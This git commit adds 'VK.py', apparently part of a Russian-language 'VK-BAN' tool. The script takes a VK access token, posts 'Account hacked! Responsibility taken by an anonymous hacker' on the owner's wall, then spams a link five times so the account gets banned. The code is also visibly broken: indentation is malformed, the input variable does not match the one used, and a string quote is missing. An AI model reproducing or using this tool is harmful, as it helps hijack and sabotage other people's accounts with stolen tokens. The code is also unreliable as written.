06bc283a7a29d06d64c5781d494628a6b0870112
pkgsearch <73498800+pkgsearch@users.noreply.github.com>
2021-01-05 12:16:42 +0300

    Add files via upload

---
+++ core/VK.py
@@ -0,0 +1,35 @@
+import requests
+import vk_api
+import os
+import time
+from colorama import Fore, Back, Style 
+    os.system("clear")
+print('''
+█░  ░█ █   ▒▓        █████░   ██   ██   █
+ ▓▒  ▒▓ █  ▒█         █   ▒█   ██   ██░  █
+ ▒█  █▒ █ ▒█          █    █  ▒██▒  █▒▓  █
+  █  █  █▒█           █   ▒█  ▓▒▒▓  █ █  █
+  █░░█  ███░          █████░  █░░█  █ ▓▓ █
+  ▓▒▒▓  █ ▒█    ███   █   ▒█  █  █  █  █ █
+  ▒██▒  █  █▓         █    █ ▒████▒ █  ▓▒█
+   ██   █   █░        █   ▒█ ▓▒  ▒▓ █  ░██
+   ██   █   ▒█        █████░ █░  ░█ █   ██
+ made by pkgsearch
+''')
+    print("""                                  
+ Забанить токен                                                      
+    """)
+ 
+            huy = input("Вводи токен") 
+            token = vk_api.VkApi(token = tok) 
+            vk = token.get_api()
+            vk.wall.post(message=Аккаунт  взломан! Ответственность взял анонимный хакер')
+            for var in range(5):
+                time.sleep(3)
+                vk.wall.post(message='vto.pe')             
+                print("[log] Сообщение отправленно. Ожидайте бана!")
+            os.system("clear")
+        except Exception as er:
+            print('Невалидный токен или страница в бане')
+           
+    
